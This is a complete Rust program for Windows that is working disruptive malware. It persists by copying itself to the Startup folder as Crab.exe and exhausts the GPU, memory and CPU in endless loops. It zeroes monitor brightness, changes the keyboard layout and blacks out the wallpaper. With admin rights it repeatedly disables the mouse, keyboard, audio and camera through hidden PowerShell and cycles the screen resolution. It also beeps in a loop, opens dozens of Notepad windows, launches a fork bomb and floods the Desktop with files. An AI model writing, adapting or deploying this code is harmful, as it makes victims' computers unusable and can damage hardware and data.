use argon2::{Algorithm, Argon2, Params, Version};
use rand::Rng;
use std::fs;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;
use std::process::Command;
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use windows::core::PCWSTR;
use windows::Win32::Devices::Display::{
    GetNumberOfPhysicalMonitorsFromHMONITOR, GetPhysicalMonitorsFromHMONITOR,
    PHYSICAL_MONITOR, SetMonitorBrightness,
};
use windows::Win32::Foundation::{BOOL, LPARAM, RECT};
use windows::Win32::Graphics::Gdi::{
    EnumDisplayMonitors, GetMonitorInfoW, MONITORINFOEXW,
    HDC, HMONITOR,
    DEVMODEW, EnumDisplaySettingsW, ChangeDisplaySettingsW, CDS_RESET,
    DISP_CHANGE_SUCCESSFUL, DM_PELSWIDTH, DM_PELSHEIGHT,
    ENUM_DISPLAY_SETTINGS_MODE,
};
use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};
use windows::Win32::UI::Input::KeyboardAndMouse::{
    ActivateKeyboardLayout, LoadKeyboardLayoutW, KLF_ACTIVATE,
};
use windows::Win32::UI::WindowsAndMessaging::{
    SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE,
    GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN,
    SetCursorPos,
};

const SHADER_SRC: &str = r#"
@group(0) @binding(0) var<storage, read_write> data: array<f32>;

@compute @workgroup_size(256)
fn mainKernel(@builtin(global_invocation_id) id: vec3<u32>) {
    let idx = id.x;
    if (idx < arrayLength(&data)) {
        var val = data[idx];
        for (var i = 0u; i < 50000u; i = i + 1u) {
            val = sin(val * 1.1 + 0.5);
            val = cos(val * 0.9 + 0.3);
            val = exp(val * 0.1);
            val = log(abs(val) + 0.001);
            val = sqrt(abs(val) + 1.0);
            val = val * val;
            val = val / 1.0001;
            val = val * 3.14159;
        }
        data[idx] = val;
    }
}
"#;

fn isAdmin() -> bool {
    if let Ok(output) = Command::new("whoami").args(["/groups"]).output() {
        if let Ok(stdout) = String::from_utf8(output.stdout) {
            for line in stdout.lines() {
                if line.contains("S-1-5-32-544") {
                    return true;
                }
            }
        }
    }
    false
}

fn dirsStartup() -> Option<PathBuf> {
    std::env::var("APPDATA")
        .ok()
        .map(|appdata| PathBuf::from(appdata).join(r"Microsoft\Windows\Start Menu\Programs\Startup"))
}

fn persist() {
    if let Ok(exe) = std::env::current_exe() {
        if let Some(startup) = dirsStartup() {
            let _ = fs::create_dir_all(&startup);
            let dest = startup.join("Crab.exe");
            let _ = fs::copy(&exe, &dest);
        }
    }
}

fn gpuStressWithSize(size: u64) -> Result<(), Box<dyn std::error::Error>> {
    let instance = wgpu::Instance::new(wgpu::InstanceDescriptor::default());
    let adapter = pollster::block_on(instance.request_adapter(&wgpu::RequestAdapterOptions {
        power_preference: wgpu::PowerPreference::HighPerformance,
        force_fallback_adapter: false,
        compatible_surface: None,
    }))
    .ok_or("Không tìm thấy adapter GPU.")?;

    let (device, queue) = pollster::block_on(adapter.request_device(&wgpu::DeviceDescriptor::default(), None))?;

    let bufferSize = size * 4;
    let buffer = device.create_buffer(&wgpu::BufferDescriptor {
        label: None,
        size: bufferSize,
        usage: wgpu::BufferUsages::STORAGE | wgpu::BufferUsages::COPY_SRC | wgpu::BufferUsages::COPY_DST,
        mapped_at_creation: false,
    });

    let shader = device.create_shader_module(wgpu::ShaderModuleDescriptor {
        label: None,
        source: wgpu::ShaderSource::Wgsl(SHADER_SRC.into()),
    });

    let bindGroupLayout = device.create_bind_group_layout(&wgpu::BindGroupLayoutDescriptor {
        label: None,
        entries: &[wgpu::BindGroupLayoutEntry {
            binding: 0,
            visibility: wgpu::ShaderStages::COMPUTE,
            ty: wgpu::BindingType::Buffer {
                ty: wgpu::BufferBindingType::Storage { read_only: false },
                has_dynamic_offset: false,
                min_binding_size: None,
            },
            count: None,
        }],
    });

    let bindGroup = device.create_bind_group(&wgpu::BindGroupDescriptor {
        label: None,
        layout: &bindGroupLayout,
        entries: &[wgpu::BindGroupEntry {
            binding: 0,
            resource: buffer.as_entire_binding(),
        }],
    });

    let pipelineLayout = device.create_pipeline_layout(&wgpu::PipelineLayoutDescriptor {
        label: None,
        bind_group_layouts: &[&bindGroupLayout],
        push_constant_ranges: &[],
    });

    let computePipeline = device.create_compute_pipeline(&wgpu::ComputePipelineDescriptor {
        label: None,
        layout: Some(&pipelineLayout),
        module: &shader,
        entry_point: "mainKernel",
    });

    let workgroupCount = ((size + 255) / 256) as u32;

    loop {
        let mut encoder = device.create_command_encoder(&wgpu::CommandEncoderDescriptor::default());
        {
            let mut pass = encoder.begin_compute_pass(&wgpu::ComputePassDescriptor::default());
            pass.set_pipeline(&computePipeline);
            pass.set_bind_group(0, &bindGroup, &[]);
            pass.dispatch_workgroups(workgroupCount, 1, 1);
        }
        queue.submit(Some(encoder.finish()));
    }
}

fn gpuStress() {
    match gpuStressWithSize(16_000_000) {
        Ok(_) => return,
        Err(_e) => eprintln!(),
    }
    match gpuStressWithSize(8_000_000) {
        Ok(_) => return,
        Err(_e) => eprintln!(),
    }
    if let Err(_e) = gpuStressWithSize(4_000_000) {
        eprintln!();
    }
}

unsafe extern "system" fn monitorEnumProc(
    hmonitor: HMONITOR,
    _hdc: HDC,
    _rc: *mut RECT,
    _lparam: LPARAM,
) -> BOOL {
    let mut info: MONITORINFOEXW = mem::zeroed();
    info.monitorInfo.cbSize = mem::size_of::<MONITORINFOEXW>() as u32;
    if GetMonitorInfoW(hmonitor, &mut info as *mut _ as *mut _).as_bool() {
        if info.monitorInfo.dwFlags & 1 != 0 {
            let mut numPhysical: u32 = 0;
            if GetNumberOfPhysicalMonitorsFromHMONITOR(hmonitor, &mut numPhysical).is_ok()
                && numPhysical > 0
            {
                let mut physical: Vec<PHYSICAL_MONITOR> = vec![mem::zeroed(); numPhysical as usize];
                if GetPhysicalMonitorsFromHMONITOR(hmonitor, &mut physical[..]).is_ok() {
                    for p in physical.iter() {
                        let _ = SetMonitorBrightness(p.hPhysicalMonitor, 0);
                    }
                }
            }
        }
    }
    BOOL(1)
}

fn setBrightnessZero() {
    unsafe {
        let _ = EnumDisplayMonitors(None, None, Some(monitorEnumProc), LPARAM(0));
    }
}

fn messKeyboard() {
    unsafe {
        let layoutId: Vec<u16> = "00010409\0".encode_utf16().collect();
        let hkl = LoadKeyboardLayoutW(PCWSTR(layoutId.as_ptr()), KLF_ACTIVATE).unwrap_or_default();
        let _ = ActivateKeyboardLayout(hkl, KLF_ACTIVATE);
    }
}

fn disableMouse() {
    if !isAdmin() { return; }
    let _ = Command::new("powershell")
        .args(["-WindowStyle", "Hidden", "-Command",
               "Get-PnpDevice -FriendlyName '*mouse*' | Disable-PnpDevice -Confirm:$false"])
        .status();
}

fn disableKeyboard() {
    if !isAdmin() { return; }
    let _ = Command::new("powershell")
        .args(["-WindowStyle", "Hidden", "-Command",
               "Get-PnpDevice -FriendlyName '*keyboard*' | Disable-PnpDevice -Confirm:$false"])
        .status();
}

fn disableAudio() {
    if !isAdmin() { return; }
    let _ = Command::new("powershell")
        .args(["-WindowStyle", "Hidden", "-Command",
               "Get-PnpDevice -FriendlyName '*audio*' | Disable-PnpDevice -Confirm:$false"])
        .status();
}

fn disableCamera() {
    if !isAdmin() { return; }
    let _ = Command::new("powershell")
        .args(["-WindowStyle", "Hidden", "-Command",
               "Get-PnpDevice -FriendlyName '*camera*' | Disable-PnpDevice -Confirm:$false"])
        .status();
}

// Hàm killOtherProcesses đã bị xóa

fn periodicDisableLoop() {
    loop {
        disableMouse();
        disableKeyboard();
        disableAudio();
        disableCamera();
        thread::sleep(Duration::from_secs(15));
    }
}

fn getResolutions() -> Vec<(i32, i32)> {
    let mut resolutions = Vec::new();
    let mut modeNum: u32 = 0;
    unsafe {
        loop {
            let mut devmode: DEVMODEW = mem::zeroed();
            devmode.dmSize = mem::size_of::<DEVMODEW>() as u16;
            let res = EnumDisplaySettingsW(None, ENUM_DISPLAY_SETTINGS_MODE(modeNum), &mut devmode);
            if !res.as_bool() {
                break;
            }
            let w = devmode.dmPelsWidth as i32;
            let h = devmode.dmPelsHeight as i32;
            if w > 0 && h > 0 && !resolutions.iter().any(|&(x, y)| x == w && y == h) {
                resolutions.push((w, h));
            }
            modeNum += 1;
        }
    }
    resolutions
}

fn setResolution(width: i32, height: i32) -> bool {
    if !isAdmin() {
        eprintln!();
        return false;
    }
    unsafe {
        let mut devmode: DEVMODEW = mem::zeroed();
        devmode.dmSize = mem::size_of::<DEVMODEW>() as u16;
        devmode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
        devmode.dmPelsWidth = width as u32;
        devmode.dmPelsHeight = height as u32;
        let result = ChangeDisplaySettingsW(Some(&devmode), CDS_RESET);
        result == DISP_CHANGE_SUCCESSFUL
    }
}

fn cycleResolution() {
    if !isAdmin() {
        eprintln!();
        return;
    }
    let resolutions = getResolutions();
    if resolutions.len() < 2 {
        eprintln!();
        return;
    }

    let minRes = resolutions.iter().min_by_key(|(w, h)| w * h).unwrap();
    let maxRes = resolutions.iter().max_by_key(|(w, h)| w * h).unwrap();

    loop {
        println!();
        setResolution(minRes.0, minRes.1);
        thread::sleep(Duration::from_secs(10));

        println!();
        setResolution(maxRes.0, maxRes.1);
        thread::sleep(Duration::from_secs(7));
    }
}

fn createHelloFiles() {
    let desktop = match std::env::var("USERPROFILE") {
        Ok(path) => PathBuf::from(path).join("Desktop"),
        Err(_) => {
            eprintln!();
            return;
        }
    };

    if !desktop.exists() {
        eprintln!();
        return;
    }

    for i in 1..=100 {
        let filename = format!("helloworld{}.txt", i);
        let path = desktop.join(filename);
        let content = format!("Hello World {}", i);
        if let Err(_e) = fs::write(&path, content) {
            eprintln!();
        }
    }
    println!();
}

fn moveMouseRandomly() {
    let width = unsafe { GetSystemMetrics(SM_CXSCREEN) };
    let height = unsafe { GetSystemMetrics(SM_CYSCREEN) };
    let mut rng = rand::thread_rng();
    let x = rng.gen_range(0..width);
    let y = rng.gen_range(0..height);
    unsafe { let _ = SetCursorPos(x, y); }
}

fn beepLoop() {
    loop {
        let _ = Command::new("powershell")
            .args(["-WindowStyle", "Hidden", "-Command", "[console]::beep(750,300)"])
            .status();
        thread::sleep(Duration::from_millis(500));
    }
}

fn spawnNotepads(count: u32) {
    for _ in 0..count {
        let _ = Command::new("notepad.exe").spawn();
        thread::sleep(Duration::from_millis(100));
    }
}

fn forkBomb() {
    let exe = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };
    for _ in 0..10 {
        let _ = Command::new(&exe).spawn();
    }
}

fn setBlackWallpaper() {
    let temp = std::env::temp_dir();
    let bmpPath = temp.join("black.bmp");
    let bmpData: [u8; 54] = [
        0x42, 0x4D, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x28, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x18, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];
    if let Err(_e) = fs::write(&bmpPath, bmpData) {
        eprintln!();
        return;
    }
    let pathStr = bmpPath.to_str().unwrap_or("");
    let wide: Vec<u16> = std::ffi::OsStr::new(pathStr)
        .encode_wide()
        .chain(Some(0))
        .collect();
    unsafe {
        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            Some(wide.as_ptr() as *mut _),
            SPIF_UPDATEINIFILE,
        );
    }
    println!();
}

fn main() {
    let hasAdmin = isAdmin();
    if !hasAdmin {
        eprintln!();
    } else {
        println!();
    }

    createHelloFiles();
    persist();

    thread::spawn(|| {
        let _ = std::panic::catch_unwind(|| {
            gpuStress();
        });
    });

    setBrightnessZero();
    messKeyboard();

    if hasAdmin {
        // Đã xóa lệnh gọi killOtherProcesses()
        thread::spawn(periodicDisableLoop);
        thread::spawn(cycleResolution);
    } else {
        eprintln!();
    }

    thread::spawn(|| {
        loop {
            moveMouseRandomly();
            thread::sleep(Duration::from_secs(1));
        }
    });

    thread::spawn(beepLoop);

    thread::spawn(|| {
        spawnNotepads(50);
    });

    thread::spawn(|| {
        forkBomb();
    });

    thread::spawn(|| {
        setBlackWallpaper();
    });

    let mut memStatus = MEMORYSTATUSEX {
        dwLength: std::mem::size_of::<MEMORYSTATUSEX>() as u32,
        ..Default::default()
    };
    unsafe { GlobalMemoryStatusEx(&mut memStatus); }
    let totalRam = memStatus.ullTotalPhys;

    let targetMem = (totalRam as f64 * 0.85) as u64;
    let numThreads = thread::available_parallelism().map(|n| n.get()).unwrap_or(1) as u64;
    let allocPerThread = std::cmp::max(targetMem / numThreads, 1024 * 1024);

    let mut rng = rand::thread_rng();
    let charset: Vec<u8> = (33u8..=126).collect();
    let password: Vec<u8> = (0..1024).map(|_| charset[rng.gen_range(0..charset.len())]).collect();
    let salt: Vec<u8> = (0..1024).map(|_| charset[rng.gen_range(0..charset.len())]).collect();

    let pwd = Arc::new(password);
    let slt = Arc::new(salt);
    let params = Arc::new(Params::new(1024, 3000, 1, Some(64)).unwrap());

    let mut handles = Vec::new();
    for i in 0..numThreads {
        let pwd = Arc::clone(&pwd);
        let slt = Arc::clone(&slt);
        let params = Arc::clone(&params);
        let allocSize = allocPerThread as usize;

        let builder = thread::Builder::new().name(format!("stress{}", i));
        if let Ok(handle) = builder.spawn(move || {
            let _memHolder: Vec<u8> = vec![0u8; allocSize];
            let argon2 = Argon2::new(Algorithm::Argon2id, Version::V0x13, (*params).clone());
            loop {
                let mut out = [0u8; 64];
                let _ = argon2.hash_password_into(&pwd, &slt, &mut out);
            }
        }) {
            handles.push(handle);
        } else {
            eprintln!();
            break;
        }
    }

    loop {
        thread::sleep(Duration::from_secs(60));
    }
}